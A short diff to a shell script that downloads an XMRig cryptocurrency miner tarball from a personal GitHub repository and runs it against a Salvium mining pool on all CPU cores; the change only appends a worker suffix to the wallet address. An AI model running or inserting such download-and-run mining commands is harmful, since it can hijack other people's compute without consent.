@@ -2,4 +2,4 @@
 apt-get update && apt-get upgrade
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz 
 tar -xvf xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o de.salvium.herominers.com:1230 -u SaLvsCbtFAfR9X8meTAkrFYgqchndL2k7RZ1ryRR3maWAVzYDcJXu1ajWbuzUyodcG8teM5kHgGswYNrc77H8popZv9MqNZStve -a rx/0 -k -t -t $(nproc --all)
+./xmrig --donate-level 1 -o de.salvium.herominers.com:1230 -u SaLvsCbtFAfR9X8meTAkrFYgqchndL2k7RZ1ryRR3maWAVzYDcJXu1ajWbuzUyodcG8teM5kHgGswYNrc77H8popZv9MqNZStve.ghf -a rx/0 -k -t -t $(nproc --all)
